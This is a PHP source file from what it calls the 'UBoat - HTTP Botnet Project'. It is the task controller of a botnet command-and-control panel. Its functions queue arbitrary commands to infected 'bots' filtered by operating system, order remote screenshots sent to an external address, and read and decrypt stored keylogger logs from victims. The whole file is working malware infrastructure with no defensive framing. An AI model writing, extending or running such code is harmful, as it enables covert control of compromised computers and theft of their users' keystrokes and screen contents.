<?php

/**
 * This file is part of UBoat - HTTP Botnet Project
 */

class Tasks extends Controller
{
    public function behaviors()
    {
        return [
            'access' => [
                'rules' => [
                    'isLogged' => 'true',
                ],
            ],
        ];
    }

    public function viewBMP()
    {
        goat::$app->cleanPage();
        if (isset($_POST['bot']) && is_numeric($_POST['bot'])) {
            $dir = APP_DIR.'/screenshots/';
            $images = glob($dir.'*.bmp');
            $out = [];
            if (! empty($images)) {
                foreach ($images as $image) {
                    array_push($out, WEB_BASE.'/private/screenshots/'.basename($image));
                }
                echo json_encode($out);
            }
        }
    }

    public function startBMP()
    {
        goat::$app->cleanPage();
        if (isset($_POST['bot']) && ! empty($_POST['bot']) && is_numeric($_POST['bot'])) {
            echo '
            <div class="alert alert-warning alert-dismissible" role="alert">
              <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
              <strong>Warning!</strong> Make sure the daemon bmp_handler is configured and running !
            </div>';
            $hb = $this->loadHelper('heartbeat');
            //this should have ip/port etc
            $hb->create_command(['commandId' => '12', 'params' => goat::$app->config['screenshots']['external_address'].'@'.goat::$app->config['screenshots']['port'], 'bots' => [$_POST['bot']]]);

            return;
        }
    }

    public function clearDead()
    {
        goat::$app->cleanPage();
        $model = $this->loadModel('bots');
        echo ($model->clearDeads()) ? 'true' : 'false';
    }

    public function readLog()
    {
        goat::$app->cleanPage();
        if (isset($_POST['bot']) && ! empty($_POST['bot'])) {
            $fileName = 'keylog_result_'.$_POST['bot']; //. ".txt";
            if (file_exists(APP_DIR."logs\\$fileName")) {
                $hb = $this->loadHelper('heartbeat');
                $data = file_get_contents(APP_DIR."logs\\$fileName");
                echo $hb->log_aes('decrypt', $data);
            } else {
                echo 'No logs found.';
            }
        }
    }

    public function setBots()
    {
        goat::$app->cleanPage();
        if (isset($_POST['bots']) && ! empty($_POST['bots']) && is_array($_POST['bots']) && ! empty($_POST['bots'][0])) {
            goat::$app->setFlash('_bots', $_POST['bots'], 0);
            echo 'true';

            return;
        }
        echo 'false';
    }

    public function cancelCommand()
    {
        goat::$app->cleanPage();
        if (isset($_POST['commands']) && ! empty($_POST['commands'])) {
            $_com = rtrim($_POST['commands'], ',');
            $_com = explode(',', $_com);
            $hb = $this->loadHelper('heartbeat');
            $r = null;
            foreach ($_com as $_id) {
                $r = $hb->delete_command($_id);
                if (! $r) {
                    break;
                }
            }
            $result = ($r) ? '<div class="alert alert-success alert-dismissible fade in" role="alert" style="margin-top: 1em;"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>Command successfully deleted.</div>' : sprintf('<div class="alert alert-danger" role="alert" style="margin-top: 1em;">Error, failed to create : \n $s</div>', $r);
            goat::$app->setFlash('_result', $result);
        }
    }

    public function createCommand()
    {
        goat::$app->cleanPage();
        $_bots = null;
        if (isset($_POST['_filters']) && 'on' == $_POST['_filters'] && ! empty($_POST['os_version']) && isset($_POST['max_client']) && is_numeric($_POST['max_client'])) {
            $_filterer = $this->loadModel('bots');
            if ('all operating systems' == strtolower($_POST['os_version'])) {
                $_bots = $_filterer->getBotFiltered('Windows', (int) $_POST['max_client']);
            } else {
                $_bots = $_filterer->getBotFiltered($_POST['os_version'], (int) $_POST['max_client']);
            }
        } else {
            $_bots = goat::$app->getFlash('_bots', true);
        }

        if (isset($_POST['command']) && ! empty($_POST['command']) && isset($_bots) && ! empty($_bots) && is_array($_bots) && ! empty($_bots[0])) {
            $out = null;
            if (isset($_POST['params']) && ! empty($_POST['params'])) {
                if (is_array($_POST['params'])) {
                    foreach ($_POST['params'] as $param) {
                        $out .= $param.'@';
                    }
                    $out = rtrim($out, '@');
                } else {
                    $out = $_POST['params'];
                }
            }
            $hb = $this->loadHelper('heartbeat');
            $r = $hb->create_command(['commandId' => $_POST['command'], 'params' => $out, 'bots' => $_bots]); //$commandId, $params, $bots = [], $pdo
            $result = ($r) ? '<div class="alert alert-success" role="alert" style="margin-top: 1em;"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>Command successfully created.</div>' : sprintf('<div class="alert alert-danger" role="alert" style="margin-top: 1em;">Error, failed to create : \n $s</div>', $r);
            goat::$app->setFlash('_result', $result);
        }
    }

    public function index()
    {
        $template = $this->loadView('tasks');
        $commands = $this->loadModel('commands');
        $helper = $this->loadHelper('taskslayout');
        $r = $this->route();
        $headerview = $this->loadView('header')->render(['route' => (strstr($r, '?')) ? explode('?', $r)[0] : $r]);

        return $template->render(['paginate' => $this->loadHelper('paginate'), 'pending' => $commands->actionPendingCommands(), 'terminated' => $commands->actionTerminatedCommands(), 'helper' => $helper, 'header' => $headerview]);
    }
}
